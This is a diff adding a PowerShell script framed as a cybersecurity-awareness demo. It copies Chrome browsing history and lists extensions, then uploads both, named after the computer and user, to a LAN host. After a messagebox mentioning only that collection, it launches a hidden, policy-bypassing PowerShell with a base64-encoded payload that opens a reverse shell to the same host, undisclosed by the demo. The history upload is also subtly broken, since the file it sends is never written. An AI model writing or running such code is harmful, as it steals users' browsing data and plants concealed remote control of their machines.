@@ -1,0 +1,71 @@
+# ========================
+# Recolección de historial
+# ========================
+$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+$computerName = $env:COMPUTERNAME
+$username = $env:USERNAME
+
+$histPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
+$tempHist = "$env:TEMP\history_copy"
+$outHistTxt = "$env:TEMP\historial_extraido.txt"
+
+if (Test-Path $histPath) {
+    Copy-Item $histPath $tempHist -Force
+
+    # Enviar historial con nombre único
+    $histFileName = "historial_${computerName}_${username}_$timestamp.txt"
+    Invoke-WebRequest -Uri "http://192.168.26.128:8080/upload?file=$histFileName" -Method POST -InFile $outHistTxt -UseBasicParsing
+}
+
+# =============================
+# Recolección de extensiones
+# =============================
+$extPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions"
+$outExtFile = "$env:TEMP\extensiones_extraidas.txt"
+
+"EXTENSIONES DE CHROME - Usuario: $username`n" | Out-File $outExtFile
+
+if (Test-Path $extPath) {
+    $manifests = Get-ChildItem -Path $extPath -Recurse -Filter "manifest.json" -ErrorAction SilentlyContinue
+
+    if ($manifests.Count -eq 0) {
+        "No se encontraron archivos manifest.json" | Out-File -Append $outExtFile
+    }
+
+    foreach ($manifest in $manifests) {
+        try {
+            $json = Get-Content $manifest.FullName -Raw | ConvertFrom-Json -ErrorAction Stop
+            $name = if ($json.name) { $json.name } else { "Desconocido" }
+            $desc = if ($json.description) { $json.description } else { "N/A" }
+            $version = if ($json.version) { $json.version } else { "N/A" }
+            $perms = if ($json.permissions) { $json.permissions -join ', ' } else { "Sin permisos" }
+
+            $info = @"
+-------------------------------
+Nombre     : $name
+Descripción: $desc
+Versión    : $version
+Permisos   : $perms
+Ruta       : $($manifest.FullName)
+-------------------------------
+"@
+            $info | Out-File -Append $outExtFile
+        } catch {
+            "[!] Error leyendo $($manifest.FullName): $($_.Exception.Message)`n" | Out-File -Append $outExtFile
+        }
+    }
+
+    # Enviar extensiones con nombre único
+    $extFileName = "extensiones_${computerName}_${username}_$timestamp.txt"
+    Invoke-WebRequest -Uri "http://192.168.26.128:8080/upload?file=$extFileName" -Method POST -InFile $outExtFile -UseBasicParsing
+}
+
+# ============================
+# Mensaje final para la demo
+# ============================
+Add-Type -AssemblyName PresentationFramework
+[System.Windows.MessageBox]::Show("Se extrajo el historial de navegación y las extensiones del navegador. ¿Notaste algo?", "Concientización de Ciberseguridad", "OK", "Warning")
+
+$encodedPayload = 'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIANgAuADEAMgA4ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
+Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle Hidden", "-ExecutionPolicy Bypass", "-EncodedCommand", $encodedPayload -WindowStyle Hidden
+exit
